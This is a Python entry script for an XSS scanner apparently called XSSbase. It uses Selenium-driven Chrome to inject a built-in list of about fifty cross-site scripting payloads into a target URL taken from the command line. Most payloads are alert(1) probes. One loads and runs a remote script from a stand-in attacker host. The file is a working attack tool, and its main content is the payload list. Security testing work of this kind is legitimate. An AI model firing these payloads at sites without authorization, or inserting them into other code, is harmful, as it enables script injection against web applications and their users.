import argparse
import os
import sys
import platform
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from .main import test_xss_payloads
from .utils import download_chromedriver

# Default XSS payloads
xss_payloads_default = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    '<img src="x" onerror="alert(1)">',
    '<body onload="alert(1)">',
    '<svg/onload=alert(1)>',
    '<iframe src="javascript:alert(1)"></iframe>',
    '"><img src="javascript:alert(1)">',
    '<svg><script>alert(1)</script>',
    '<details open ontoggle=alert(1)>',
    '<object data="javascript:alert(1)">',
    '<embed src="javascript:alert(1)">',
    '<link rel="stylesheet" href="javascript:alert(1)">',
    '<form><button formaction="javascript:alert(1)">CLICKME',
    '"><iframe src="javascript:alert(1)">',
    '<input type="image" src="javascript:alert(1)">',
    '<a href="javascript:alert(1)">CLICKME</a>',
    '<video src="javascript:alert(1)">',
    '<audio src="javascript:alert(1)">',
    '<base href="javascript:alert(1)//">',
    '<script src="data:text/javascript,alert(1)"></script>',
    '<input onfocus="alert(1)" autofocus>',
    '<button onclick="alert(1)">CLICKME</button>',
    '<marquee onstart="alert(1)">XSS</marquee>',
    '<keygen autofocus onfocus="alert(1)">',
    '<textarea onfocus="alert(1)" autofocus></textarea>',
    '<div onpointerover="alert(1)">Hover me</div>',
    '<div draggable="true" ondrag="alert(1)">Drag me</div>',
    '<span onclick="alert(1)">CLICKME</span>',
    '<select onfocus="alert(1)" autofocus><option>XSS</select>',
    '<isindex type=image src=javascript:alert(1)>',
    '<img src=x onerror="this.onerror=null; alert(1)">',
    '<img src=x onerror=alert(1)//',
    '<img src=x onerror="alert(1)";>',
    '<img src=x onerror="alert(1)">',
    '<img src=x onerror=alert(String.fromCharCode(88,83,83))>',
    '<img src="javascript:alert(1)">',
    '<script>alert(1)</script>',
    '<img src=1 href=1 onerror="alert(1)" >',
    '<svg><g onload="alert(1)"></g></svg>',
    '<svg/onload=alert(1)>',
    '<script x>alert(1)</script>',
    '<script src=//code.jquery.com/jquery-3.3.1.min.js></script><script>$.getScript("//attacker.com/xss.js")</script>',
    '<math><maction xlink:href="javascript:alert(1)">XSS</maction></math>',
    '<img src="x:alert(1)"/>',
    '<x onclick=alert(1)>XSS</x>',
    '<body onscroll=alert(1)>',
    '<bgsound src="javascript:alert(1)">',
    '<blink onmouseover=alert(1)>XSS</blink>',
    '<plaintext onmouseover=alert(1)>XSS'
]

def main():
    # Check if the operating system is Windows
    if platform.system() != 'Windows':
        print("This tool only supports Windows.")
        sys.exit(1)

    # Define the argument parser
    parser = argparse.ArgumentParser(
        description="XSSbase - A professional tool for scanning XSS vulnerabilities.",
        epilog="Author: Fidal\nGitHub: https://github.com/mr-fidal\n\n"
               "Copyright 2024 Fidal. All rights reserved. "
               "Unauthorized copying of this tool, via any medium is strictly prohibited."
    )
    parser.add_argument('--url', required=True, help='URL to test for XSS vulnerability')
    parser.add_argument('--payload', help='File containing XSS payloads to test')
    args = parser.parse_args()

    # Download the chromedriver if it doesn't exist
    download_chromedriver()

    # Set up Chrome WebDriver
    service = Service('chromedriver-win64/chromedriver.exe')  # Specify the path to chromedriver executable
    driver = webdriver.Chrome(service=service)

    try:
        if args.payload:
            with open(args.payload, 'r') as f:
                xss_payloads = f.readlines()
                # Remove newline characters from payloads
                xss_payloads = [payload.strip() for payload in xss_payloads]
        else:
            # Use default XSS payloads if no payload file provided
            xss_payloads = xss_payloads_default
        
        # Test XSS payloads
        for payload in xss_payloads:
            test_xss_payloads(driver, args.url, payload)
    finally:
        # Close the browser
        driver.quit()

if __name__ == "__main__":
    main()
